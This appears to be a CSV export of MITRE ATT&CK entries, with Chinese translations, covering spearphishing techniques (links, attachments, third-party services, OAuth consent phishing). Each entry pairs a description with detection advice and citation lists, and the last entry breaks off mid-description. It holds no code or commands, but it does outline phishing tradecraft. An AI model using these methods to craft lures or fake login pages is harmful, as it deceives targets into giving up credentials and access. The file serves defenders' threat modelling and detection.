T1598.003,Phishing for Information: Spearphishing Link,"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. 

From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",https://attack.mitre.org/techniques/T1598/003,02 October 2020,21 October 2022,1.3,Reconnaissance,"Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.",PRE,"Application Log: Application Log Content, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1598,,"Menachem Goldstein; Philip Winther; Robert Simmons, @MalwareUtkonos; Sebastian Salla, McAfee",,,,,,,"(Citation: Proofpoint TA453 March 2021),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: Phish Labs Silent Librarian),(Citation: ATT Sidewinder January 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Volexity Ocean Lotus November 2020),(Citation: Proofpoint TA453 July2021),(Citation: Secureworks COBALT DICKENS August 2018),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Malwarebytes Silent Librarian October 2020),(Citation: AADInternals Documentation),(Citation: DOJ Iran Indictments March 2018),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: Certfa Charming Kitten January 2021),(Citation: Proofpoint TA407 September 2019),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)",信息网络钓鱼/通过网络钓鱼收集信息：鱼叉式钓鱼链接,攻击者可能会发送带有恶意链接的鱼叉式钓鱼邮件，以获取可在定位期间使用的敏感信息。鱼叉式网络钓鱼是一种试图诱骗目标泄露信息、经常是凭据或其他可操作信息的尝试。信息鱼叉式网络钓鱼经常涉及社会工程技术，例如冒充来源收集信息（例如：[建立帐户](https://attack.mitre.org/techniques/T1585) 或[危害帐户](https ://attack.mitre.org/techniques/T1586)) 和/或发送多个看似紧急的消息。所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，恶意电子邮件通常包含带有社交工程文本的链接，以诱使用户主动单击或复制 URL 并将其粘贴到浏览器中。（引用：TrendMictro 网络钓鱼）（引用：PCMag FakeLogin）给定的网站可能是合法站点（例如在线或公司登录门户）的克隆，或者在外观上可能与合法站点非常相似并且具有包含来自真实站点的元素的 URL。从虚假网站，信息以网络形式收集并发送给对手。攻击者还可能使用来自先前侦察工作的信息（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或 [搜索受害者拥有的网站](https://attack.mitre .org/techniques/T1594)) 制作有说服力和可信的诱饵。
T1598.001,Phishing for Information: Spearphishing Service,"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",https://attack.mitre.org/techniques/T1598/001,02 October 2020,15 April 2021,1.0,Reconnaissance,"Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1598,,"Robert Simmons, @MalwareUtkonos",,,,,,,",",信息网络钓鱼/通过网络钓鱼收集信息：鱼叉式网络钓鱼服务,攻击者可能会通过第三方服务发送鱼叉式钓鱼消息，以获取可在定位期间使用的敏感信息。鱼叉式网络钓鱼是一种试图诱骗目标泄露信息、经常是凭据或其他可操作信息的尝试。信息鱼叉式网络钓鱼经常涉及社会工程技术，例如冒充来源收集信息（例如：[建立帐户](https://attack.mitre.org/techniques/T1585) 或[危害帐户](https ://attack.mitre.org/techniques/T1586)) 和/或发送多个看似紧急的消息。所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，攻击者通过各种社交媒体服务、个人网络邮件和其他非企业控制的服务发送消息。（引用：ThreatPost 社交媒体网络钓鱼）这些服务的安全策略可能不如企业严格。与大多数鱼叉式网络钓鱼一样，目标是与目标建立融洽关系或以某种方式获得目标的兴趣。对手可能会创建虚假的社交媒体账户并向员工发送信息以获得潜在的工作机会。这样做可以提供一个合理的理由来询问有关其环境的服务、政策和信息。攻击者还可能使用来自先前侦察工作的信息（例如：[社交媒体](https://attack.mitre.org/techniques/T1593/001) 或[搜索受害者拥有的网站](https://attack.mitre. org/techniques/T1594)) 制作有说服力和可信的诱饵。
T1566.001,Phishing: Spearphishing Attachment,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",https://attack.mitre.org/techniques/T1566/001,02 March 2020,18 October 2021,2.2,Initial Access,"Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.

Monitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)","Linux, Windows, macOS","Application Log: Application Log Content, File: File Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1566,,Philip Winther,,,,CAPEC-163,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: CSM Elderwood Sept 2012),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Uptycs Confucius APT Jan 2021),(Citation: FireEye Fin8 May 2016),(Citation: FireEye Obfuscation June 2017),(Citation: Cylance Shaheen Nov 2018),(Citation: Symantec Inception Framework March 2018),(Citation: Unit 42 Phishery Aug 2018),(Citation: ESET Gamaredon June 2020),(Citation: TrendMicro TropicTrooper 2015),(Citation: McAfee Bankshot),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: McAfee Sodinokibi October 2019),(Citation: Symantec Tick Apr 2016),(Citation: Cylance Sodinokibi July 2019),(Citation: TrendMicro Taidoor),(Citation: ATT QakBot April 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021),(Citation: Trend Micro Tick November 2019),(Citation: Unit 42 Inception November 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint TA416 November 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: Symantec Elderwood Sept 2012),(Citation: Securelist Darkhotel Aug 2015),(Citation: Group IB Ransomware September 2020),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Volexity Patchwork June 2018),(Citation: MSTIC NOBELIUM May 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Securelist Dropping Elephant),(Citation: FireEye APT10 April 2017),(Citation: Talos Lokibot Jan 2021),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Gigamon Berserk Bear October 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: KISA Operation Muzabi),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Proofpoint TA459 April 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: FireEye admin@338),(Citation: Prevailion DarkWatchman 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Unit 42 ProjectM March 2016),(Citation: Symantec Emotet Jul 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Carbon Black Emotet Apr 2019),(Citation: ThreatConnect Kimsuky September 2020),(Citation: SecureWorks August 2019),(Citation: Zscaler Higaisa 2020),(Citation: ClearSky MuddyWater June 2019),(Citation: CheckPoint Naikon May 2020),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: HackerNews IndigoZebra July 2021),(Citation: Unit 42 Valak July 2020),(Citation: DOJ FIN7 Aug 2018),(Citation: IBM IcedID November 2017),(Citation: Unit42 Redaman January 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Unit 42 Playbook Dec 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: CERT-EE Gamaredon January 2021),(Citation: McAfee Oceansalt Oct 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Malwarebytes Pony April 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye APT19),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Cybereason Kimsuky November 2020),(Citation: 360 Machete Sep 2020),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Antiy CERT Ramsay April 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Trend Micro Qakbot December 2020),(Citation: Recorded Future REDDELTA July 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: TrendMicro Trickbot Feb 2019),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: G Data Sodinokibi June 2019),(Citation: Accenture MUDCARP March 2019),(Citation: Cymmetria Patchwork),(Citation: Flashpoint FIN 7 March 2019),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Symantec Chafer February 2018),(Citation: eSentire FIN7 July 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: IBM TA505 April 2020),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Microsoft PLATINUM April 2016),(Citation: Proofpoint TA505 June 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: ESET T3 Threat Report 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: US-CERT Emotet Jul 2018),(Citation: Malwarebytes Konni Aug 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: FireEye APT37 Feb 2018),(Citation: Microsoft Actinium February 2022),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: McAfee Lazarus Jul 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Trend Micro IXESHE 2012),(Citation: Security Affairs DustSquad Oct 2018),(Citation: Talos Transparent Tribe May 2021),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Group IB Cobalt Aug 2017),(Citation: Secureworks REvil September 2019),(Citation: FireEye APT32 April 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Picus Sodinokibi January 2020),(Citation: Talos Group123),(Citation: Kroll Qakbot June 2020),(Citation: Check Point Warzone Feb 2020),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Lazarus APT January 2022),(Citation: Symantec Gallmaker Oct 2018),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Symantec Bumblebee June 2022),(Citation: Proofpoint NETWIRE December 2020),(Citation: Talos Oblique RAT March 2021),(Citation: Proofpoint TA505 Mar 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: Proofpoint TA505 Sep 2017),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET OceanLotus),(Citation: Kaspersky MoleRATs April 2019),(Citation: Group IB Silence Sept 2018),(Citation: Microsoft Holmium June 2020),(Citation: Trend Micro Emotet Jan 2019),(Citation: Malwarebytes Emotet Dec 2017),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FireEye APT29 Nov 2018),(Citation: NTT Security Flagpro new December 2021),(Citation: Visa FIN6 Feb 2019),(Citation: Securelist Machete Aug 2014),(Citation: ESET Dukes October 2019),(Citation: FireEye Hancitor),(Citation: Talos Emotet Jan 2019),(Citation: Group IB RTM August 2019),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Trend Micro TA505 June 2019),(Citation: F-Secure The Dukes),(Citation: Cybereason TA505 April 2019),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Picus Emotet Dec 2018),(Citation: Talos PoetRAT April 2020),(Citation: Rancor Unit42 June 2018),(Citation: SecureList Silence Nov 2017),(Citation: Secureworks GOLD CABIN),(Citation: Mandiant APT1),(Citation: Sofacy DealersChoice),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: FireEye APT30),(Citation: CitizenLab Tropic Trooper Aug 2018),(Citation: Secureworks IRON TILDEN Profile),(Citation: Unit 42 NETWIRE April 2020),(Citation: Talos Frankenstein June 2019),(Citation: FireEye APT39 Jan 2019),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Qualys LolZarus),(Citation: Cybereason Bumblebee August 2022),(Citation: iSight Sandworm Oct 2014),(Citation: Check Point Rocket Kitten),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: RiskIQ Cobalt Nov 2017),(Citation: US-CERT Ukraine Feb 2016),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: FireEye FIN7 April 2017),(Citation: Proofpoint Cobalt June 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: VirusBulletin Kimsuky October 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Proofpoint Leviathan Oct 2017),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: ESET Casbaneiro Oct 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: CIS Emotet Apr 2017),(Citation: Moran 2014),(Citation: Anomali Static Kitten February 2021),(Citation: TrendMicro Tonto Team October 2020),(Citation: ESET Nomadic Octopus 2018),(Citation: Cybereason Molerats Dec 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Securelist ScarCruft May 2019),(Citation: Zdnet Kimsuky Dec 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Palo Alto Sofacy 06-2018),(Citation: Juniper IcedID June 2020),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Anomali Pirate Panda April 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: SANS Windshift August 2018),(Citation: Securelist Sofacy Feb 2018),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Cyberint Qakbot May 2021),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)",网络钓鱼：鱼叉式网络钓鱼附件,攻击者可能会发送带有恶意附件的鱼叉式钓鱼电子邮件，以试图访问受害系统。鱼叉式网络钓鱼附件是鱼叉式网络钓鱼的一种特定变体。鱼叉式网络钓鱼附件与其他形式的鱼叉式网络钓鱼不同，它使用附加到电子邮件的恶意软件。所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，攻击者将文件附加到鱼叉式网络钓鱼电子邮件中，并且通常依靠 [用户执行](https://attack.mitre.org/techniques/T1204) 来获得执行。鱼叉式网络钓鱼还可能涉及社会工程技术，例如冒充可信来源。附件有许多选项，例如 Microsoft Office 文档、可执行文件、PDF 或存档文件。打开附件（并可能单击过去的保护措施）后，攻击者的有效负载会利用漏洞或直接在用户系统上执行。鱼叉式网络钓鱼邮件的文本通常试图给出一个合理的理由来说明为什么应该打开文件，并且可能会解释如何绕过系统保护来这样做。该电子邮件还可能包含有关如何解密附件（例如 zip 文件密码）的说明，以规避电子邮件边界防御。攻击者经常操纵文件扩展名和图标，以使附加的可执行文件看起来是文档文件，或者利用一个应用程序的文件看起来是另一个应用程序的文件。
T1566.002,Phishing: Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").(Citation: CISA IDN ST05-016)

Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)",https://attack.mitre.org/techniques/T1566/002,02 March 2020,21 October 2022,2.3,Initial Access,"URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites as well as links redirecting to adversary infrastructure based by upon suspicious OAuth patterns with unusual TLDs.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021). Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.

Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Because this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","Google Workspace, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1566,,"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Kobi Haimovich, CardinalOps; Mark Wee; Menachem Goldstein; Philip Winther; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army)",,,,CAPEC-163,,,"(Citation: CSM Elderwood Sept 2012),(Citation: Cyberreason Anchor December 2019),(Citation: IBM Grandoreiro April 2020),(Citation: EST Kimsuky April 2019),(Citation: ATT QakBot April 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Secureworks Cobalt Gypsy Feb 2017),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Lazarus Jun 2020),(Citation: ESET Zebrocy May 2019),(Citation: Symantec Elderwood Sept 2012),(Citation: Cylance Machete Mar 2017),(Citation: Group IB Ransomware September 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: Cybereason Bazar July 2020),(Citation: Volexity Patchwork June 2018),(Citation: MSTIC NOBELIUM May 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: KISA Operation Muzabi),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Symantec Emotet Jul 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye APT33 Sept 2017),(Citation: Threatpost Hancitor),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Google Election Threats October 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Night Dragon),(Citation: FBI FLASH APT39 September 2020),(Citation: Malwarebytes Pony April 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Trend Micro Qakbot December 2020),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: FireEye Clandestine Wolf),(Citation: AADInternals Documentation),(Citation: Cyble Sidewinder September 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: US-CERT Emotet Jul 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Mandiant No Easy Breach),(Citation: Cylance Dust Storm),(Citation: Talos Transparent Tribe May 2021),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: FireEye APT32 April 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Kroll Qakbot June 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: McAfee Dianxun March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ATT Sidewinder January 2021),(Citation: Talos Oblique RAT March 2021),(Citation: Trend Micro Qakbot May 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: Proofpoint TA505 Sep 2017),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET OceanLotus),(Citation: Kaspersky MoleRATs April 2019),(Citation: Malwarebytes Emotet Dec 2017),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: ESET EvilNum July 2020),(Citation: Talos Emotet Jan 2019),(Citation: SentinelOne Valak June 2020),(Citation: Microsoft Targeting Elections September 2020),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Trend Micro TA505 June 2019),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Picus Emotet Dec 2018),(Citation: Zscaler Bazar September 2020),(Citation: Mandiant APT1),(Citation: Unit 42 NETWIRE April 2020),(Citation: FireEye APT39 Jan 2019),(Citation: Cybereason Bumblebee August 2022),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Volexity Ocean Lotus November 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Symantec Patchwork),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Talos Cobalt Group July 2018),(Citation: CIS Emotet Apr 2017),(Citation: Anomali Static Kitten February 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Kaspersky Emotet Jan 2019),(Citation: Certfa Charming Kitten January 2021),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: SANS Windshift August 2018),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)",网络钓鱼：鱼叉式钓鱼链接,攻击者可能会发送带有恶意链接的鱼叉式钓鱼电子邮件，以试图访问受害系统。带有链接的鱼叉式网络钓鱼是鱼叉式网络钓鱼的一种特定变体。它与其他形式的鱼叉式网络钓鱼不同，它使用链接下载电子邮件中包含的恶意软件，而不是将恶意文件附加到电子邮件本身，以避免可能检查电子邮件附件的防御措施。鱼叉式网络钓鱼还可能涉及社会工程技术，例如冒充可信来源。所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，恶意电子邮件包含链接。通常，链接会伴随社会工程文本，并要求用户主动单击或复制 URL 并将其粘贴到浏览器中，利用 [用户执行](https://attack.mitre.org/techniques/T1204)。被访问的网站可能会利用漏洞攻击 Web 浏览器，或者会提示用户首先下载应用程序、文档、zip 文件甚至可执行文件，具体取决于电子邮件的借口。攻击者还可能包括旨在直接与电子邮件阅读器交互的链接，包括旨在直接利用终端系统或验证电子邮件接收的嵌入式图像（即网络错误/网络信标）。此外，攻击者可能会使用看似良性的链接滥用特殊字符来模仿合法网站（称为“IDN 同形异义词攻击”）。（引用：CISA IDN ST05-016）攻击者还可能利用链接来执行同意网络钓鱼，通常使用 OAuth 2.0请求 URL 在用户接受时为恶意应用程序提供权限/访问权限，从而允许攻击者 [窃取应用程序访问令牌](https://attack.mitre.org/techniques/T1528)s。（引用：趋势科技典当风暴 OAuth 2017）这些被盗的访问令牌允许攻击者通过 API 调用代表用户执行各种操作。 （引用：Microsoft OAuth 2.0 同意网络钓鱼 2021）
T1566.003,Phishing: Spearphishing via Service,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

